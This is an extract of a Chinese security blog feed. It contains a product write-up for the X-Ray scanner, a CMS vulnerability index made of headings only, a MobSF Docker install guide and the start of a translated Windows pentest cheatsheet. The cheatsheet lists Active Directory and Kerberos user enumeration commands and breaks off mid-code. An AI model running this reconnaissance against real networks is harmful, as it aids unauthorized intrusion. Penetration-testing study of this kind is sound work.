高度自定义，扫描深度隐藏漏洞</h2><p>（X-Ray）提供主机扫描和Web扫描功能，企业可以定期对网络进行扫描，帮助及时发现威胁，客观评估风险等级，根据扫描结果修复安全漏洞，在攻击者发起攻击前做到防患于未然。<br>企业网络环境不断更新迭代，一成不变的扫描方法显然不能应对层出不穷的安全威胁。企业需要一个可以灵活定制的安全评估系统，根据自身需求调整扫描策略。（X-Ray）提供丰富的自定义功能模板，用户可选择单个或自由组合扫描模块，真正实现高度自定义扫描，尽可能从交叉维度更全面地发现安全问题。<br>同时，为了应对不同的网络环境和内部管理需求，X-Ray可实现多工作区管理，支持对网络、部门、个人三个层面进行逻辑隔离：同一个用户可以在多个不同的工作区之间切换，不同的用户可以共享一个工作区达到协同工作的目的。在扫描过程中，每个扫描任务独立进行，扫描速度不受网站复杂程度影响。</p><h2 id="2-2-主机扫描"><a href="#2-2-主机扫描" class="headerlink" title="2.2 主机扫描"></a>2.2 主机扫描</h2><p>X-Ray可对主机或者网段进行扫描，识别其中存活的主机以及开放的端口，并通过对端口进行指纹识别，获取端口的协议、服务、应用等信息，进而制定扫描策略。<br>扫描过程中，X-Ray利用对应的POC进行测试，找出主机中存在的漏洞，扫描结果输出资产及漏洞信息。长亭漏洞库由安全团队专人维护，实时更新高质量漏洞，保证发现率，出现新漏洞时能做到迅速响应以避免损失。</p><h2 id="2-3-Web扫描"><a href="#2-3-Web扫描" class="headerlink" title="2.3 Web扫描"></a>2.3 Web扫描</h2><p>X-Ray支持通过收集网站信息，对网站结构进行建模，根据数据信息发起漏洞探测，从而确定网站可能遭受的风险。</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191115162728.png" class="lozad"></p><p>（X-Ray）提供多种模式的爬虫扫描，包括普通爬虫和模拟浏览器的爬虫，<br>完美支持Web2.0网站、H5页面、单页网页应用、前后端网页应用等，并能模拟客户端发出的请求，动态解析javascript及动态渲染DOM结构。<br>同时，用户可利用请求调度引擎，根据需求调整HTTP请求的参数和速率，根据<br>网站情况自由控制扫描速度，既不会因为扫描太快影响业务导致系统瘫痪，也不会因为速度太慢影响扫描需求。<br>目前，X-Ray除了能覆盖主流常见的各漏洞类型，还支持检测XSS、SQL注入、敏感信息泄露、任意跳转、Web登录表单的爆破五种高危漏洞。</p><h2 id="2-4-XSS漏洞检测"><a href="#2-4-XSS漏洞检测" class="headerlink" title="2.4 XSS漏洞检测"></a>2.4 XSS漏洞检测</h2><p>XSS漏洞检测包括GET参数、请求头部、POST参数，支持多种Content-Type的分析检测。通过对网页进行静态分析，过滤注入点从而降低误报率。通过对网页进行动态分析，判定需要基于网页渲染执行的XSS，降低漏报率，不遗漏任何漏洞。</p><h2 id="2-5-SQL注入漏洞检测"><a href="#2-5-SQL注入漏洞检测" class="headerlink" title="2.5 SQL注入漏洞检测"></a>2.5 SQL注入漏洞检测</h2><p>SQL注入漏洞检测包括GET参数、请求头部、POST参数，支持多种Con-<br>tent-Type的分析检测。运用基于响应时间、响应请求的文本特征与结构特征等维度的智能算法多方面判定漏洞，确保高发现率和低误报率。</p><h2 id="2-6-敏感信息泄露漏洞检测"><a href="#2-6-敏感信息泄露漏洞检测" class="headerlink" title="2.6 敏感信息泄露漏洞检测"></a>2.6 敏感信息泄露漏洞检测</h2><p>敏感信息泄露漏洞检测能够发现的信息有：<br>· 敏感文件：备份文件、源码仓库、后台登录页面、WebShell、临时文件等。<br>· 敏感信息：debug信息、报错信息、用户隐私信息等。<br>检测扫描敏感文件、敏感信息，依据返回包的相关特征智能判断是否存在信息泄<br>露，误报率较低。</p><h2 id="2-7-Web登录表单的爆破漏洞检测"><a href="#2-7-Web登录表单的爆破漏洞检测" class="headerlink" title="2.7  Web登录表单的爆破漏洞检测"></a>2.7  Web登录表单的爆破漏洞检测</h2><p>X-Ray通过对网页分别进行静态分析和动态分析，得出合法的表单认证请求，保证爆破过程正常进行，集成具有代表性的爆破字典和领先的爆破算法，能高效地完成爆破任务。</p><h1 id="0x03-从发现到修复，多维展示安全状态"><a href="#0x03-从发现到修复，多维展示安全状态" class="headerlink" title="0x03 从发现到修复，多维展示安全状态"></a>0x03 从发现到修复，多维展示安全状态</h1><p>X-Ray不仅能实时呈现扫描结果，并且可以展示多维、详细的漏洞信息，从不同角度体现风险情况，并给出建议修复方案，帮助企业全面掌握更丰富的安全状态。</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191115162750.png" class="lozad"></p><p>不同需求的用户可从中得到对应的信息，以便快速理解逐个漏洞的危害与影响，<br>有效修复关键漏洞。<br>同时，依托长亭长期的高标准安全服务，X-Ray在发现漏洞后，第一时<br>间给出系列修复建议：</p><ol><li>紧急修复方案：无需用户参与，即可指导用户在WAF等安全防护产品上添加规则，及时避免损失。</li><li>应用升级策略：对于发生在成熟服务应用上的漏洞，查找应用版本提供升级信息，或及时打上补丁。</li><li>代码修复方案：提供代码修改信息，通过编程的方式彻底修复漏洞。X-Ray支持统一管理扫描发现的全部漏洞，根据漏洞状态跟踪全生命期，并同时促进修复的闭环，提升整个企业的安全性。漏洞管理功能可集中查看修复状态、安排复测工作，支持根据多种条件对漏洞进行筛选。</li></ol><h2 id="3-1-漏洞修复状态"><a href="#3-1-漏洞修复状态" class="headerlink" title="3.1 漏洞修复状态"></a>3.1 漏洞修复状态</h2><p>支持手动更改修复状态，对漏洞进行标记，可单独设置状态或批量操作，跟踪漏洞生命周期。</p><h2 id="3-2-漏洞复测"><a href="#3-2-漏洞复测" class="headerlink" title="3.2 漏洞复测"></a>3.2 漏洞复测</h2><p>系统即时或预设定时进行循环扫描，批量进行漏洞复测并验收漏洞修复状况。</p><h1 id="0x04-集中维护，轻松管理千万级资产"><a href="#0x04-集中维护，轻松管理千万级资产" class="headerlink" title="0x04 集中维护，轻松管理千万级资产"></a>0x04 集中维护，轻松管理千万级资产</h1><p>不同于传统扫描器对用户资产只能进行罗列展示，X-Ray的资产管理功能可以对资产进行一站式增加、删除、编辑、导出等操作，帮助用户从域名、主机、服务、网站、资产分布、风险分布等维度进行数据统计。对于同一资产，用户可与历史扫描结果对比，清晰了解不同资产的安全态势变化。<br>X-Ray支持从扫描结果自动导入资产，可以由管理员手动补充修正。资产分为域名、主机、服务、网站四类，每种资产都提供单独的管理方式，用户可根据企业需求选择分类，轻松管理千万级的大量资产，增强系统安全性，降低安全风险。</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191115162804.png" class="lozad"></p><p>资产扫描完成后，管理功能支持根据域名、主机、服务、网站、操作系统版<br>本、资产安全状态等对资产列表进行统一管理，概括而言主要有以下三个方面的<br>特色：<br>    1） 不同资产单独管理以匹配企业需求，降低安全风险；<br>    2） 支持扫描发现资产和手动维护并行，可实现交叉处理从而提高管理效率；<br>    3） 实时更新资产信息，安全状态清晰明了。</p><p>#0x05策略级统计分析，提供全面决策依据</p><p>IT系统资产规模越来越大，风险资产、漏洞数量越来越多，如何从海量的风险数据中找到需要优先处理的问题，已经成为安全运维人员面临的一个难题。<br>X-Ray能够导出资产、漏洞、扫描结果等多项报告，每种报告提供丰富的报告模板，详细展示发现的信息。高度自定义生成的报告，辅助丰富的可视化效果，方便直观展示内容。</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191115162815.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191115162826.png" class="lozad"></p><p>通过对发现的漏洞进行评分，标记危险等级，X-Ray能根据漏洞严重程度进行排序，快速定位具体漏洞，重点关注需要优先修复的问题。</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191115162843.png" class="lozad"></p><h1 id="0x06-X-Ray安全评估系统优势"><a href="#0x06-X-Ray安全评估系统优势" class="headerlink" title="0x06 X-Ray安全评估系统优势"></a>0x06 X-Ray安全评估系统优势</h1><h2 id="6-1-高发现率，低误报率"><a href="#6-1-高发现率，低误报率" class="headerlink" title="6.1 高发现率，低误报率"></a>6.1 高发现率，低误报率</h2><p>X-Ray由长亭高质量的漏洞库和多个功能插件模块支撑，扫描质量高。不同于使用第三方漏洞库，长亭的漏洞库从多年攻防实战和安全服务项目经验中提炼而得，并由专人团队进行维护，更新速度快且质量高，大大提高了漏洞的发现率。同时，<br>X-Ray结合主动扫描和被动扫描两种方式，降低误报率，发现更隐蔽的漏洞。</p><h2 id="6-2-多维定位扫描结果"><a href="#6-2-多维定位扫描结果" class="headerlink" title="6.2 多维定位扫描结果"></a>6.2 多维定位扫描结果</h2><p>X-Ray全面展示资产信息和风险列表，最终输出详细的扫描评估结果，并给出建议修复方案。扫描结果从多个角度对漏洞进行描述，企业管理者可迅速获知企业安全的薄弱环节，制定针对性的安全策略，安全运维人员则可获取详细的技术信息，为后期修复提供支持。</p><h2 id="6-3-不影响业务运转"><a href="#6-3-不影响业务运转" class="headerlink" title="6.3 不影响业务运转"></a>6.3 不影响业务运转</h2><p>在扫描过程中，漏洞检测必须做到安全有效，否则可能会对扫描目标产生不可恢<br>复的影响。X-Ray从三个方面进行控制，实现精准扫描的同时不影响业务：<br>1）核心扫描技术由长亭经验丰富的安全团队提供，确保扫描过程中使用完全无<br>害且能确认漏洞的Payload。<br>2）智能识别并绕过可能对业务产生副作用的API。<br>3）通过智能探测或手动调整的方式合理控制扫描速度，确保不对业务产生压力。</p><h2 id="6-4开放API方便集成使用"><a href="#6-4开放API方便集成使用" class="headerlink" title="6.4开放API方便集成使用"></a>6.4开放API方便集成使用</h2><p>X-Ray以Open API的方式提供所有功能，可以方便地被自动化调用，<br>同时能够与其他安全产品（如SOC、SIEM、JIRA、Redmine等）整合。<br>当行业爆发0day漏洞时，长亭应急响应团队会快速跟进，分析漏洞产生的原因，<br>在极短时间内提供POC扫描插件，用户只需要上传扫描插件，即可对0day漏洞进行<br>全面检查，保障企业网络安全。<br>X-Ray还支持一键导入长亭渗透测试报告，跟进漏洞的全生命周期，促<br>进漏洞修复。</p><hr>]]></content>
      
      
      <categories>
          
          <category> 神兵利器 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> X-RAY </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CMS漏洞集合</title>
      <link href="/2019/10/12/CMS%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/"/>
      <url>/2019/10/12/CMS%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>在渗透测试的过程中，会碰到各种CMS搭建的网站，为了积累自己的经验，决定将每种CMS爆出的漏洞整理成文章，这样既方便自己查看，也可以分享给需要的人，大家共同讨论，进步。</p><a id="more"></a><h1 id="0x01-DedeCMS"><a href="#0x01-DedeCMS" class="headerlink" title="0x01 DedeCMS"></a>0x01 DedeCMS</h1><h2 id="1-1-DedeCMS-v5-7-shops-delivery-存储型XSS"><a href="#1-1-DedeCMS-v5-7-shops-delivery-存储型XSS" class="headerlink" title="1.1 DedeCMS_v5.7_shops_delivery_存储型XSS"></a>1.1 DedeCMS_v5.7_shops_delivery_存储型XSS</h2><h2 id="1-2-DedeCMS-v5-7-carbuyaction-存储型XSS"><a href="#1-2-DedeCMS-v5-7-carbuyaction-存储型XSS" class="headerlink" title="1.2 DedeCMS_v5.7_carbuyaction_存储型XSS"></a>1.2 DedeCMS_v5.7_carbuyaction_存储型XSS</h2><h2 id="1-3-DedeCMS-v5-7-友情链接CSRF-GetShell"><a href="#1-3-DedeCMS-v5-7-友情链接CSRF-GetShell" class="headerlink" title="1.3 DedeCMS_v5.7_友情链接CSRF_GetShell"></a>1.3 DedeCMS_v5.7_友情链接CSRF_GetShell</h2><h2 id="1-4-DedeCMS-V5-7-SP2后台存在代码执行漏洞"><a href="#1-4-DedeCMS-V5-7-SP2后台存在代码执行漏洞" class="headerlink" title="1.4 DedeCMS V5.7 SP2后台存在代码执行漏洞"></a>1.4 DedeCMS V5.7 SP2后台存在代码执行漏洞</h2><h1 id="0x02-Discuz"><a href="#0x02-Discuz" class="headerlink" title="0x02 Discuz"></a>0x02 Discuz</h1><h2 id="2-1-Discuz-＜3-4-birthprovince-前台任意文件删除"><a href="#2-1-Discuz-＜3-4-birthprovince-前台任意文件删除" class="headerlink" title="2.1 Discuz_＜3.4_birthprovince_前台任意文件删除"></a>2.1 Discuz_＜3.4_birthprovince_前台任意文件删除</h2><h1 id="0x03-Drupal"><a href="#0x03-Drupal" class="headerlink" title="0x03 Drupal"></a>0x03 Drupal</h1><h2 id="3-1-Drupal远程代码执行漏洞-CVE-2017-6920"><a href="#3-1-Drupal远程代码执行漏洞-CVE-2017-6920" class="headerlink" title="3.1 Drupal远程代码执行漏洞(CVE-2017-6920)"></a>3.1 Drupal远程代码执行漏洞(CVE-2017-6920)</h2><h1 id="0x04-Ecshop"><a href="#0x04-Ecshop" class="headerlink" title="0x04 Ecshop"></a>0x04 Ecshop</h1><h1 id="0x05-FineCMS"><a href="#0x05-FineCMS" class="headerlink" title="0x05 FineCMS"></a>0x05 FineCMS</h1><h2 id="5-1-FineCMS最新版5-0-8两处getshell"><a href="#5-1-FineCMS最新版5-0-8两处getshell" class="headerlink" title="5.1 FineCMS最新版5.0.8两处getshell"></a>5.1 FineCMS最新版5.0.8两处getshell</h2><h1 id="0x06-Joomla"><a href="#0x06-Joomla" class="headerlink" title="0x06 Joomla"></a>0x06 Joomla</h1><h2 id="6-1-Joomla-3-7-0-SQL注入-CVE-2017-8917"><a href="#6-1-Joomla-3-7-0-SQL注入-CVE-2017-8917" class="headerlink" title="6.1 Joomla_3.7.0_SQL注入(CVE-2017-8917)"></a>6.1 Joomla_3.7.0_SQL注入(CVE-2017-8917)</h2><h2 id="6-2-Joomla-3-4-4-3-6-3-未授权创建特权用户-CVE-2016-8869"><a href="#6-2-Joomla-3-4-4-3-6-3-未授权创建特权用户-CVE-2016-8869" class="headerlink" title="6.2 Joomla_3.4.4-3.6.3_未授权创建特权用户(CVE-2016-8869)"></a>6.2 Joomla_3.4.4-3.6.3_未授权创建特权用户(CVE-2016-8869)</h2><h1 id="0x07-Metinfo"><a href="#0x07-Metinfo" class="headerlink" title="0x07 Metinfo"></a>0x07 Metinfo</h1><h1 id="0x08-PHPCMS"><a href="#0x08-PHPCMS" class="headerlink" title="0x08 PHPCMS"></a>0x08 PHPCMS</h1><h2 id="8-1-PHPCMS-v9-6-0-SQL注入"><a href="#8-1-PHPCMS-v9-6-0-SQL注入" class="headerlink" title="8.1 PHPCMS_v9.6.0_SQL注入"></a>8.1 PHPCMS_v9.6.0_SQL注入</h2><h2 id="8-2-PHPCMS-v9-6-0-任意文件上传"><a href="#8-2-PHPCMS-v9-6-0-任意文件上传" class="headerlink" title="8.2 PHPCMS_v9.6.0_任意文件上传"></a>8.2 PHPCMS_v9.6.0_任意文件上传</h2><h2 id="8-3-PHPCMS-v9-6-1-任意文件下载"><a href="#8-3-PHPCMS-v9-6-1-任意文件下载" class="headerlink" title="8.3 PHPCMS_v9.6.1_任意文件下载"></a>8.3 PHPCMS_v9.6.1_任意文件下载</h2><h2 id="8-4-PHPCMS-v9-6-2-任意文件下载"><a href="#8-4-PHPCMS-v9-6-2-任意文件下载" class="headerlink" title="8.4 PHPCMS_v9.6.2_任意文件下载"></a>8.4 PHPCMS_v9.6.2_任意文件下载</h2><h1 id="0x09-Struts"><a href="#0x09-Struts" class="headerlink" title="0x09 Struts"></a>0x09 Struts</h1><h2 id="9-1-S2-048-CVE-CVE-2017-9791"><a href="#9-1-S2-048-CVE-CVE-2017-9791" class="headerlink" title="9.1 S2-048(CVE-CVE-2017-9791)"></a>9.1 S2-048(CVE-CVE-2017-9791)</h2><h1 id="0x10-ThinkPHP"><a href="#0x10-ThinkPHP" class="headerlink" title="0x10 ThinkPHP"></a>0x10 ThinkPHP</h1><h2 id="10-1-ThinkPHP-3-2-3-5-0-10-缓存函数设计缺陷"><a href="#10-1-ThinkPHP-3-2-3-5-0-10-缓存函数设计缺陷" class="headerlink" title="10.1 ThinkPHP_3.2.3-5.0.10_缓存函数设计缺陷"></a>10.1 ThinkPHP_3.2.3-5.0.10_缓存函数设计缺陷</h2><h1 id="0x11-ThinkSNS"><a href="#0x11-ThinkSNS" class="headerlink" title="0x11 ThinkSNS"></a>0x11 ThinkSNS</h1><h2 id="11-1-ThinkSNS-V4-后台任意文件下载导致Getshell"><a href="#11-1-ThinkSNS-V4-后台任意文件下载导致Getshell" class="headerlink" title="11.1 ThinkSNS_V4 后台任意文件下载导致Getshell"></a>11.1 ThinkSNS_V4 后台任意文件下载导致Getshell</h2><h1 id="0x12-WebLogic"><a href="#0x12-WebLogic" class="headerlink" title="0x12 WebLogic"></a>0x12 WebLogic</h1><h2 id="12-1-CVE-2017-3506-amp-CVE-2017-10271-XmlDecoder"><a href="#12-1-CVE-2017-3506-amp-CVE-2017-10271-XmlDecoder" class="headerlink" title="12.1 CVE-2017-3506 &amp; CVE-2017-10271 XmlDecoder"></a>12.1 CVE-2017-3506 &amp; CVE-2017-10271 XmlDecoder</h2><h2 id="12-2-CVE-2018-2628-T3-Deserialize"><a href="#12-2-CVE-2018-2628-T3-Deserialize" class="headerlink" title="12.2 CVE-2018-2628 T3 Deserialize"></a>12.2 CVE-2018-2628 T3 Deserialize</h2><h2 id="12-3-CVE-2018-2628-bypassing-CVE-2018-2893-T3-Deserialize"><a href="#12-3-CVE-2018-2628-bypassing-CVE-2018-2893-T3-Deserialize" class="headerlink" title="12.3 CVE-2018-2628 bypassing CVE-2018-2893 T3 Deserialize"></a>12.3 CVE-2018-2628 bypassing CVE-2018-2893 T3 Deserialize</h2><h1 id="0x13-WordPress"><a href="#0x13-WordPress" class="headerlink" title="0x13 WordPress"></a>0x13 WordPress</h1><h2 id="13-1-WordPress-4-4-SSRF"><a href="#13-1-WordPress-4-4-SSRF" class="headerlink" title="13.1 WordPress_4.4_SSRF"></a>13.1 WordPress_4.4_SSRF</h2><h2 id="13-2-WordPress-4-7-Info-Disclosure"><a href="#13-2-WordPress-4-7-Info-Disclosure" class="headerlink" title="13.2 WordPress_4.7_Info_Disclosure"></a>13.2 WordPress_4.7_Info_Disclosure</h2><h2 id="13-3-WordPress-4-7-0-4-7-1-未授权内容注入"><a href="#13-3-WordPress-4-7-0-4-7-1-未授权内容注入" class="headerlink" title="13.3 WordPress_4.7.0-4.7.1_未授权内容注入"></a>13.3 WordPress_4.7.0-4.7.1_未授权内容注入</h2><h2 id="13-4-Wordpress-lt-4-9-6-任意文件删除漏洞"><a href="#13-4-Wordpress-lt-4-9-6-任意文件删除漏洞" class="headerlink" title="13.4 Wordpress &lt;= 4.9.6 任意文件删除漏洞"></a>13.4 Wordpress &lt;= 4.9.6 任意文件删除漏洞</h2><h1 id="0x14-seacms"><a href="#0x14-seacms" class="headerlink" title="0x14 seacms"></a>0x14 seacms</h1><h2 id="14-1-SeaCMS-v6-45前台Getshell-代码执行"><a href="#14-1-SeaCMS-v6-45前台Getshell-代码执行" class="headerlink" title="14.1 SeaCMS v6.45前台Getshell 代码执行"></a>14.1 SeaCMS v6.45前台Getshell 代码执行</h2><h2 id="14-2-seacms6-54代码执行"><a href="#14-2-seacms6-54代码执行" class="headerlink" title="14.2 seacms6.54代码执行"></a>14.2 seacms6.54代码执行</h2><h2 id="14-3-seacms-6-55-代码执行"><a href="#14-3-seacms-6-55-代码执行" class="headerlink" title="14.3 seacms 6.55 代码执行"></a>14.3 seacms 6.55 代码执行</h2><h2 id="14-4-seacms6-61-XSS"><a href="#14-4-seacms6-61-XSS" class="headerlink" title="14.4 seacms6.61 XSS"></a>14.4 seacms6.61 XSS</h2><h2 id="14-5-Seacms6-61后台getshell"><a href="#14-5-Seacms6-61后台getshell" class="headerlink" title="14.5 Seacms6.61后台getshell"></a>14.5 Seacms6.61后台getshell</h2><h1 id="0x04-参考链接"><a href="#0x04-参考链接" class="headerlink" title="0x04 参考链接"></a>0x04 参考链接</h1><p><a href="https://github.com/SecWiki/CMS-Hunter/tree/master/DedeCMS/DedeCMS_V5.7" target="_blank" rel="noopener">https://github.com/SecWiki/CMS-Hunter/tree/master/DedeCMS/DedeCMS_V5.7</a>_</p><p>### </p><hr>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用docker安装移动安全框架（MobSF）</title>
      <link href="/2019/10/11/%E4%BD%BF%E7%94%A8docker%E5%AE%89%E8%A3%85%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8%E6%A1%86%E6%9E%B6%EF%BC%88MobSF%EF%BC%89/"/>
      <url>/2019/10/11/%E4%BD%BF%E7%94%A8docker%E5%AE%89%E8%A3%85%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8%E6%A1%86%E6%9E%B6%EF%BC%88MobSF%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>移动安全框架（MobSF）是一种自动化的一体化移动应用程序（Android /iOS /Windows）笔测试框架，能够执行静态，动态和恶意软件分析。它可用于Android，iOS和Windows移动应用程序的有效和快速安全分析，并支持二进制文件（APK，IPA和APPX）和压缩源代码。MobSF可以在运行时为Android应用程序进行动态应用程序测试，并具有由<a href="https://github.com/MobSF/CapFuzz" target="_blank" rel="noopener">CapFuzz</a>（一种特定于Web API的安全扫描程序）提供支持的Web API模糊测试功能。MobSF旨在使您的CI / CD或DevSecOps管道集成无缝。</p><a id="more"></a><h1 id="0x01-开始安装"><a href="#0x01-开始安装" class="headerlink" title="0x01 开始安装"></a>0x01 开始安装</h1><blockquote><p>安装环境：</p><p>Kali Linux x64</p><p>Docker</p><p>Python3.6环境</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">#使用python3环境</span></span><br><span class="line">update-alternatives --config python</span><br></pre></td></tr></table></figure><p>选择python3前面的编号</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191114161228.png" class="lozad"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#卸载docker，如何之前安装的话</span></span><br><span class="line">apt-get purge docker.io</span><br></pre></td></tr></table></figure><p>下载docker安装包</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget  https://download.docker.com/linux/debian/dists/jessie/pool/stable/amd64/docker-ce_17.06.2~ce-0~debian_amd64.deb</span><br></pre></td></tr></table></figure><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191114161236.png" class="lozad"></p><p>安装docker</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dpkg  -i docker-ce_17.06.2~ce-0~debian_amd64.deb</span><br></pre></td></tr></table></figure><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191114161252.png" class="lozad"></p><p>启动docker服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service  docker restart</span><br></pre></td></tr></table></figure><p>docker一键部署framework-mobsf</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull opensecurity/mobile-security-framework-mobsf</span><br></pre></td></tr></table></figure><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191114161327.png" class="lozad"></p><h1 id="0x02-开始使用"><a href="#0x02-开始使用" class="headerlink" title="0x02 开始使用"></a>0x02 开始使用</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -it -p 8000:8000 opensecurity/mobile-security-framework-mobsf:latest</span><br></pre></td></tr></table></figure><p>然后在kali中使用获取浏览器访问：htpp://0.0.0.0:8000</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191114161335.png" class="lozad"></p><p>或者使用ifconfig命令查看kali的ip地址，然后使用<a href="http://kali的ip地址:8000访问" target="_blank" rel="noopener">http://kali的ip地址:8000访问</a></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191114161357.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191114161412.png" class="lozad"></p><h1 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h1><p>如果不适用docker一键化部署的话，可能非常的繁琐，所以这里使用了docker进行一键化部署，由于是同事推荐的，然后直接教我怎么部署了，这里也避免走了一些坑，所以大家在部署的过程中还碰到坑的话，就自行百度吧 ^v^.</p><p><img alt="img" data-src="https://i01piccdn.sogoucdn.com/f8a32ef987767296" class="lozad"></p><hr>]]></content>
      
      
      <categories>
          
          <category> 神兵利器 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MobSF </tag>
            
            <tag> 移动安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows Notes</title>
      <link href="/2019/10/11/Windows-Notes/"/>
      <url>/2019/10/11/Windows-Notes/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>本文为翻译文章，为了记录在对Windows系统进行渗透测试过程中的一些命令和知识。</p><p>原文链接：<a href="https://m0chan.github.io/2019/07/30/Windows-Notes-and-Cheatsheet.html" target="_blank" rel="noopener">https://m0chan.github.io/2019/07/30/Windows-Notes-and-Cheatsheet.html</a></p><a id="more"></a><h1 id="0x01-列举"><a href="#0x01-列举" class="headerlink" title="0x01 列举"></a>0x01 列举</h1><h2 id="1-1-基本命令"><a href="#1-1-基本命令" class="headerlink" title="1.1 基本命令"></a>1.1 基本命令</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">net users</span><br><span class="line">net users /domain</span><br><span class="line">net localgroup</span><br><span class="line">net groups /domain</span><br><span class="line">net groups /domain &quot;Domain Admins&quot;</span><br><span class="line"></span><br><span class="line">Get-ADUser</span><br><span class="line">Get-Domain</span><br><span class="line">Get-DomainUser</span><br><span class="line">Get-DomainGroup</span><br><span class="line">Get-DomainGroupMember -identity &quot;Domain Admins&quot; -Domain m0chanAD.local -DomainController 10.10.14.10</span><br><span class="line">Find-DomainShare</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#Host Discovery</span><br><span class="line">netdiscover -r subnet/24</span><br><span class="line">nbtscan -r [range]</span><br><span class="line">for /L %i in (1,1,255) do  @ping.exe -n 1 -w 50 &lt;10.10.10&gt;.%i | findstr TTL</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#Reverse DNS Lookup</span><br><span class="line">$ComputerIPAddress = &quot;10.10.14.14&quot;</span><br><span class="line">[System.Net.Dns]::GetHostEntry($ComputerIPAddress).HostName</span><br></pre></td></tr></table></figure><p><a href="https://github.com/tevora-threat/SharpView" target="_blank" rel="noopener">https://github.com/tevora-threat/SharpView</a></p><h3 id="1-1-1-具有SPN的用户"><a href="#1-1-1-具有SPN的用户" class="headerlink" title="1.1.1 具有SPN的用户"></a>1.1.1 具有SPN的用户</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Get-DomainUser -SPN</span><br><span class="line"></span><br><span class="line">Get-ADComputer -filter &#123;ServicePrincipalName -like &lt;keyword&gt;&#125; -Properties OperatingSystem,OperatingSystemVersion,OperatingSystemServicePack,</span><br><span class="line">PasswordLastSet,LastLogonDate,ServicePrincipalName,TrustedForDelegation,TrustedtoAuthForDelegation</span><br></pre></td></tr></table></figure><h3 id="1-1-2-Kerberos枚举"><a href="#1-1-2-Kerberos枚举" class="headerlink" title="1.1.2 Kerberos枚举"></a>1.1.2 Kerberos枚举</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap $TARGET -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm=&apos;test&apos;</span><br></pre></td></tr></table></figure><h3 id="1-1-3-红队CSharp脚本"><a href="#1-1-3-红队CSharp脚本" class="headerlink" title="1.1.3 红队CSharp脚本"></a>1.1.3 红队CSharp脚本</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span 